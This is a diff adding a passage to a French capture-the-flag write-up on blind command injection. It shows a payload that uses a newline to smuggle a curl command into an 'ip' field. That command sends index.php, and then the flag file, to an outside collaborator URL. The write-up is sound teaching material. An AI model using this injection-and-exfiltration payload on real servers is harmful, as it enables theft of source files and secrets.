@@ -142,4 +142,63 @@ Nous pouvons voir qu'il y a ABSOLUMENT rien du tout. Mais ne vous découragez pa
 
 Il se peut que le serveur ne nous montre pas de façon explicite et qu'il va falloir aller chercher plus loin avec des options dans curl. Et c'est ce que nous allons actuellement faire. 
 
+Si nous cherchons plus profondément dans les options de curl, nous pouvons voir une option qui s'appelle 
+```bash
+--data-urlencode
+```
 
+Ce qui est parfait pour nous, car si vous vous intéressez à l'option (voici le lien : https://everything.curl.dev/http/post/url-encode.html#url-encode-data). Vous pouvez remarquer qu'elle permet d'encoder en URL le contenu que nous souhaitons envoyer et que nous n'avons pas encore encodé.  
+
+Ici, nous allons la combiner avec  "@nom_fichier" qui va nous permettre de charger les données à partir d'un fichier indiqué.
+
+Mais quel fichier devons-nous choisir ? " Nous le savons grâce à l'énoncé qui nous dit qu'il faut aller chercher le flag dans le fichier index.php.
+
+
+Ce qui nous donne : 
+
+```bash
+curl+--data-urlencode+"@index.php"+http://votre_lien
+```
+
+
+Ce qui faut envoyer : 
+
+```bash
+ip=127.0.0.1%0acurl+--data-urlencode+"@index.php"+http://votre_lien
+```
+
+Pour ma part cela donne : 
+
+![](../img/Pasted%20image%2020261015001600.png)
+
+Comme vous pouvez le voir, cela a fonctionné, maintenant il va falloir aller récupérer la requête dans collaborator et l'analyser.
+
+
+
+![](../img/Pasted%20image%2020261015001836.png)
+
+
+Okay, nous venons de recevoir ce que l'on voulait qui était le contenu de la page index.html. 
+
+Maintenant, deux options s'offrent à vous : soit vous faites confiance à Burpsuite, vous sélectionnez puis dans Inspector cela va décoder automatiquement, soit vous allez sur un site comme Cyberchef. 
+
+Personnellement, je fais confiance à Burpsuite sur la rapidité car il suffit de sélectionner. 
+
+![](../img/Pasted%20image%2020261015002108.png)
+
+
+Nous pouvons voir que le flag est dans le contenu du fichier qui est ici caché, car je ne souhaite pas que vous puissiez tricher. Faites-vous-même, cela va vous permettre d'apprendre en effectuant les commandes. 
+
+
+Maintenant, il suffit de remplacer dans notre payload @index.php par le fichier qui est appelé.
+
+![](../img/Pasted%20image%2020261015002428.png)
+
+
+![](../img/Pasted%20image%2020261015002539.png)
+
+Bingo, maintenant essayons de valider le challenge avec le flag : 
+
+![](../img/Pasted%20image%2020261015002619.png)
+
+Bien joué ! On se retrouve pour un prochain challenge ! 
